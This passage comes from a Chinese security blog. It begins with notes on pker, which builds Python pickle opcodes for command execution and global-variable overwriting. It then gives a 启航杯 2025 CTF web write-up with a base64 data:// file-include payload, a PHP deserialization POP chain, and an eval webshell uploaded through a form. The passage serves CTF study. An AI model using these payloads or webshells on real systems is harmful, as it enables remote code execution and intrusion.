class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">以下<span class="hljs-keyword">module</span>都可以是包含`.`的子<span class="hljs-keyword">module</span><br>调用函数时，注意传入的参数类型要和示例一致<br>对应的opcode会被生成，但并不与pker代码相互等价<br><br><span class="hljs-keyword">GLOBAL</span><br>对应opcode：b<span class="hljs-string">&#x27;c&#x27;</span><br>获取<span class="hljs-keyword">module</span>下的一个全局对象（没有import的也可以，比如下面的os）：<br><span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>输入：<span class="hljs-keyword">module</span>,instance(callable、<span class="hljs-keyword">module</span>都是instance)  <br><br>INST<br>对应opcode：b<span class="hljs-string">&#x27;i&#x27;</span><br>建立并入栈一个对象（可以执行一个函数）：<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>输入：<span class="hljs-keyword">module</span>,callable,para <br><br>OBJ<br>对应opcode：b<span class="hljs-string">&#x27;o&#x27;</span><br>建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：<br>OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>输入：callable,para<br><br>xxx(xx,...)<br>对应opcode：b<span class="hljs-string">&#x27;R&#x27;</span><br>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）<br><br>li[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-number">321</span><br>或<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hello&#x27;</span><br>对应opcode：b<span class="hljs-string">&#x27;s&#x27;</span><br>更新列表或字典的某项的值<br><br>xx.attr<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>对应opcode：b<span class="hljs-string">&#x27;b&#x27;</span><br>对xx对象进行属性设置<br><br><span class="hljs-keyword">return</span><br>对应opcode：b<span class="hljs-string">&#x27;0&#x27;</span><br>出栈（作为pickle.loads函数的返回值）：<br><span class="hljs-keyword">return</span> xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）<br></code></pre></td></tr></table></figure><p>注意：</p><ol><li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li><li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-built_in">return</span> <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>被解析为：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">b<span class="hljs-string">&quot;S&#x27;123&#x27;<span class="hljs-subst">\n</span>p0<span class="hljs-subst">\n</span>0g0<span class="hljs-subst">\n</span>.&quot;</span><br></code></pre></td></tr></table></figure><h4 id="pker：全局变量覆盖"><a href="#pker：全局变量覆盖" class="headerlink" title="pker：全局变量覆盖"></a>pker：全局变量覆盖</h4><ul><li>覆盖直接由执行文件引入的<code>secret</code>模块中的<code>name</code>与<code>category</code>变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">secret</span>=GLOBAL(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;secret&#x27;</span>) <br><span class="hljs-comment"># python的执行文件被解析为__main__对象，secret在该对象从属下</span><br><span class="hljs-attr">secret.name</span>=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-attr">secret.category</span>=<span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>覆盖引入模块的变量：</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">game</span> = GLOBAL(<span class="hljs-string">&#x27;guess_game&#x27;</span>, <span class="hljs-string">&#x27;game&#x27;</span>)<br><span class="hljs-attr">game.curr_ticket</span> = <span class="hljs-string">&#x27;123&#x27;</span><br></code></pre></td></tr></table></figure><p>接下来会给出一些具体的基本操作的实例。</p><h4 id="pker：函数执行"><a href="#pker：函数执行" class="headerlink" title="pker：函数执行"></a>pker：函数执行</h4><ul><li>通过<code>b&#39;R&#39;</code>调用：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">s<span class="hljs-operator">=</span><span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-keyword">system</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-keyword">system</span>(s) # `b<span class="hljs-string">&#x27;R&#x27;</span>`调用<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;i&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><ul><li>通过<code>b&#39;c&#39;</code>与<code>b&#39;o&#39;</code>调用：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>多参数调用函数</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span></span><br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)</span></span><span class="hljs-selector-attr">[, par0,par1...]</span>)<br></code></pre></td></tr></table></figure><h4 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h4><ul><li>实例化对象是一种特殊的函数执行</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-meta"># 或者</span><br><br>animal = OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><ul><li>其中，python原文件中包含：</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name, category</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.category = category<br></code></pre></td></tr></table></figure><ul><li>也可以先实例化再赋值：</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul><li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li><li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li></ul><p>参考：</p><p><a href="https://xz.aliyun.com/news/7032">https://xz.aliyun.com/news/7032</a> 先知大佬</p><p><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> 官方文档</p><p><a href="https://tttang.com/archive/1294/">https://tttang.com/archive/1294/</a> P神</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>启航杯</title>
    <link href="/tuyi/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AF/"/>
    <url>/tuyi/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="启航杯2025-1-25"><a href="#启航杯2025-1-25" class="headerlink" title="启航杯2025.1.25"></a>启航杯2025.1.25</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>也是第一次正式比赛akweb啊  呜呜呜 虽然多不难</p><h3 id="Easy-include"><a href="#Easy-include" class="headerlink" title="Easy_include"></a>Easy_include</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$file</span>))<br>    &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;no no no ~ &quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简单的文件包含</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">file</span>=data://text/plain<span class="hljs-comment">;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></code></pre></td></tr></table></figure><p>伪协议加编码绕过</p><h3 id="Web-pop"><a href="#Web-pop" class="headerlink" title="Web_pop"></a>Web_pop</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$func</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to QHCTF 2025, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>简单的pop</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">eeee</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj-&gt;func=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="PCREMagic"><a href="#PCREMagic" class="headerlink" title="PCREMagic"></a>PCREMagic</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?php.*?eval.*?\(.*?\).*?\?&gt;/is&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;data/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bad request&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$user_dir</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$user_dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$user_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">random_int</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$path</span>);<br><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$path</span>&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">303</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>文件上传，但是过滤用的是非贪婪过滤</p><p>直接绕过就行</p><p>webshell:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>写个表单上传</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文件上传<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>上传文件<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://challenge.qihangcup.cn:33406/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>选择文件：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>上传文件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>蚁剑直接连接就行</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy_RSA"></a>Easy_RSA</h3><p>gpt直接搜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 